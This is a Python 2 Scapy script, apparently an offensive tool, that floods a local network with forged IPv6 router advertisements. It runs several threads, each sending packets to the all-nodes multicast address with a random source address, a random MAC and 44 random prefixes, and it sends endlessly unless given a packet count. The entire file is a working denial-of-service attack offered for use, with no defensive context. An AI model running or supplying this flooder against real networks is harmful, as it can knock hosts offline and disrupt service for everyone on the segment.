#! /usr/bin/python2
from scapy.all import * #required for packet crafting
import random	#generates mac, ipv6 address
import threading #for multithreading
import sys

try:
    print sys.argv[3] #check if all arguments have been supplied
except:
    print 'usage:',sys.argv[0],' interface thread-count packet-oount' #fail if not
    sys.exit(0)

class RA_Flooder (threading.Thread): #worker class for threading
    def __init__(self, counter=0):
		threading.Thread.__init__(self)
		self.iface = sys.argv[1]
		self.counter = counter 

    def prefix_pack(self): #build the actual packet
		self.pkt = ICMPv6NDOptPrefixInfo() 
		self.pkt.prefixlen = 64
		#self.pkt.prefix = "cc5f::"          #use for broadcast address instead of random prefix
		self.pkt.prefix = self.prefix_rand() #randomize prefix
		#self.pkt.show() #debug
		return self.pkt

    def ipv6_rand(self): #generate random ipv6 address
		self.rand = ':'.join('{:x}'.format(random.randint(0,2**16 - 1)) for i in range(4))
		return 'fe80::' + self.rand

    def prefix_rand(self): #generate random ipv6 prefix
		self.pre_rand = ':'.join('{:x}'.format(random.randint(0,2**16 - 1)) for i in range(2))
		return '2012:' + self.pre_rand + ':b304::'

    def mac_rand(self): #generate random mac address
		self.mac = ':'.join('{:x}'.format(random.randint(0,2**8 - 1)) for i in range(6))
		return str(self.mac)

    def packet_gen(self):
        #build the actual packet in scapy
        self.a = IPv6()	#set as an IPv6 packet
        self.a.dst = "ff02::1" #dst is set to broadcast
        self.a.src = self.ipv6_rand() #the source is randomized
        self.a.nh = 58

        self.b = ICMPv6ND_RA() #set as router advertisment
        self.b.routerlifetime = 0

        self.c = ICMPv6NDOptSrcLLAddr()
        self.c.lladdr = self.mac_rand()

        self.d = ICMPv6NDOptMTU()
    	self.e = ICMPv6NDOptPrefixInfo()
    	self.e.prefixlen = 64
        #self.e.prefix = self.prefix_rand()

        self.pk = self.a/self.b/self.c/self.d
        for i in range(44):
            self.pk = self.pk/self.prefix_pack()
        return self.pk

    def run(self):
        self.s = conf.L3socket(iface=self.iface) #use correct interface
        if self.counter is 0: #if the counter is zero, continue forever
            while True:
                self.pkt = self.packet_gen() #create a packet as fast as possible, sned it
                self.s.send(self.pkt)
        else: #otherwise, use until packet count (per thread) has been met
            for x in range(self.counter):
                self.pkt = self.packet_gen()
                self.s.send(self.pkt)
        print '[*] Finished sending'

threadLock = threading.Lock() 
threads = [] #store all threads
for x in range(0, int(sys.argv[2])): #create threads
    t = RA_Flooder(int(sys.argv[3])) #create thread with correct variables
    threads.append(t) #add thread to array
for t in threads:
    t.start() #start thread
    print '[+] Thread started ' + str(x) 
print 'All threads started'
